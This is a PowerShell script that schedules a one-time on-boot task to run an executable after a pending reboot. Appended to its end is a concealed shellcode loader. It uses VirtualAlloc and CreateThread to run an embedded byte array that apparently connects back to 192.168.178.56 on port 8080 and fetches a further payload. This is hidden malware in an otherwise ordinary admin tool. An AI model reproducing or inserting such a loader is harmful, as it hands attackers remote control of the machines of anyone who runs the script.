
[CmdletBinding()]
param (
	[Parameter(Mandatory)]
	[ValidateScript({ Test-Path -Path $_ -PathType 'Leaf' })]
	[string]$FilePath,
	[Parameter()]
	[string]$Arguments,
	[switch]$Force
)

begin {
	$ErrorActionPreference = 'Stop'
	Set-StrictMode -Version Latest
	
	function New-OnBootScheduledTask {
		
		[CmdletBinding()]
		param (
			[Parameter(Mandatory)]
			[string]$Name,
			[Parameter(Mandatory)]
			[ValidateScript({Test-Path -Path $_ -PathType 'Leaf' })]
			[string]$FilePath,
			[Parameter()]
			[string]$Description,
			[Parameter()]
			[string]$Arguments
		)
		process {
			try {
				
				$Service = new-object -ComObject ("Schedule.Service")
				
				
				$Service.Connect()
				$RootFolder = $Service.GetFolder("\")
				
				$TaskDefinition = $Service.NewTask(0)
				$TaskDefinition.RegistrationInfo.Description = $Description
				$TaskDefinition.Settings.Enabled = $true
				$TaskDefinition.Settings.AllowDemandStart = $true
				$TaskDefinition.Settings.DeleteExpiredTaskAfter = 'PT0S'
				
				$Triggers = $TaskDefinition.Triggers
				
				$Trigger = $Triggers.Create(8) 
				$Trigger.Enabled = $true
				
				$TaskEndTime = [datetime]::Now.AddMinutes(30)
				$Trigger.EndBoundary = $TaskEndTime.ToString("yyyy-MM-dd'T'HH:mm:ss")
				
				
				$Action = $TaskDefinition.Actions.Create(0)
				$Action.Path = $FilePath
				$action.Arguments = $Arguments
				
				
				$RootFolder.RegisterTaskDefinition($Name, $TaskDefinition, 6, "System", $null, 5) | Out-Null
			} catch {
				Write-Error $_.Exception.Message
			}
		}
	}
	
	function Test-PendingReboot {
		
		[CmdletBinding()]
		param ()
		process {
			
			try {
				$OperatingSystem = Get-WmiObject -Class Win32_OperatingSystem -Property BuildNumber, CSName
				
				
				If ($OperatingSystem.BuildNumber -ge 6001) {
					$PendingReboot = Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing' -Name 'RebootPending' -ErrorAction SilentlyContinue
					if ($PendingReboot) {
						Write-Verbose -Message 'Reboot pending detected in the Component Based Servicing registry key'
						return $true
					}
				}
				
				
				$PendingReboot = Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update' -Name 'RebootRequired' -ErrorAction SilentlyContinue
				if ($PendingReboot) {
					Write-Verbose -Message 'WUAU has a reboot pending'
					return $true
				}
				
				
				$PendingReboot = Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager' -Name 'PendingFileRenameOperations' -ErrorAction SilentlyContinue
				if ($PendingReboot -and $PendingReboot.PendingFileRenameOperations) {
					Write-Verbose -Message 'Reboot pending in the PendingFileRenameOperations registry value'
					return $true
				}
			} catch {
				Write-Error $_.Exception.Message
			}
		}
	}
	
	function Request-Restart {
		
		$Title = 'Restart Computer'
		$Message = "The computer is pending a reboot. Shall I reboot now and start the script when it comes back up?"
		$Yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", "Restart the computer now"
		$No = New-Object System.Management.Automation.Host.ChoiceDescription "&No", "Delay the restart until a later time"
		$Options = [System.Management.Automation.Host.ChoiceDescription[]]($Yes, $No)
		$Result = $Host.ui.PromptForChoice($Title, $Message, $Options, 0)
		switch ($Result) {
			0 { $true }
			1 { $false }
		}
	}
}

process {
	try {
		Write-Verbose -Message 'Checking to see if there are any pending reboot operations'
		if (Test-PendingReboot) { 
			Write-Verbose -Message 'Found a pending reboot operation'
			
			$Params = @{
				'Name' = 'TemporaryBootAction';
				'FilePath' = $FilePath
			}
			if ($Arguments) {
				$Params.Arguments = $Arguments	
			}
			Write-Verbose -Message 'Creating a new on-boot scheduled task'
			New-OnBootScheduledTask @Params
			Write-Verbose 'Created on-boot scheduled task'
			if ($Force.IsPresent) { 
				Write-Verbose -Message 'The force parameter was chosen.  Restarting computer now'
				Restart-Computer -Force
			} elseif (Request-Restart) { 
				Restart-Computer -Force 
			} else { 
				Write-Verbose 'User cancelled the reboot operation but continuing to run script'
				& $FilePath $Arguments
			}
		} else { 
			Write-Verbose -Message 'No reboot operations pending.  Running executable'
			& $FilePath $Arguments
		}
	} catch {
		Write-Error $_.Exception.Message
	}
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xb2,0x38,0x68,0x02,0x00,0x1f,0x90,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

